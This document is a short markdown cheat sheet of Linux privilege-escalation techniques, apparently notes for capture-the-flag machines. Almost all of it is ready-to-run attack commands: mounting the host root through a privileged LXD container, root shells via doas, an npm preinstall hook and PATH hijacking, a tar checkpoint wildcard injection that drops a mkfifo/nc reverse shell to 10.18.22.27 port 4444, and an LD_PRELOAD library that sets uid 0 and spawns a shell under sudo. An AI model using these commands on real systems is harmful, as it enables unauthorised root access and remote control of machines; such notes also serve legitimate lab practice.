<details><summary> LXD container exploitation </summary> 

```bash
wget archive
lxc image import ./archive --alias myimage
lxc image list
lxc init myimage ignite -c security.privileged=true # If not working, use FINGERPRINT
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
```
</details>
<details><summary> with doas </summary>

```bash
doas -u root openssl enc -in file
doas -u root /bin/bash
```
</details>
<details><summary> with npm -u </summary>

```bash
mkdir ~/tmp
echo '{"scripts": {"preinstall": "/bin/sh"}}' > ~/tmp/package.json
sudo -u serv-manage /usr/bin/npm -C ~/tmp/ --unsafe-perm i
```
</details>
<details><summary>PATH</summary>

```bash
echo /bin/sh > curl
chmod 777 curl
export PATH=/tmp:$PATH
./app_that_calls_curl
```

</details>
<details><summary>tar</summary>

```bash
cat > /home/andre/backup/rev << EOF
#!/bin/bash
rm /tmp/f
mkfifo /tmp/f
cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.22.27 4444 >/tmp/f
EOF
echo "" > "/home/andre/backup/--checkpoint=1"
echo "" > "/home/andre/backup/--checkpoint-action=exec=sh rev"
chmod +x rev
```
</details>
<details><summary>env_keep += LD_PRELOAD</summary>

```bash
cd /tmp
cat > shell.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}
EOF
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/sky_backup_utility
```
</details>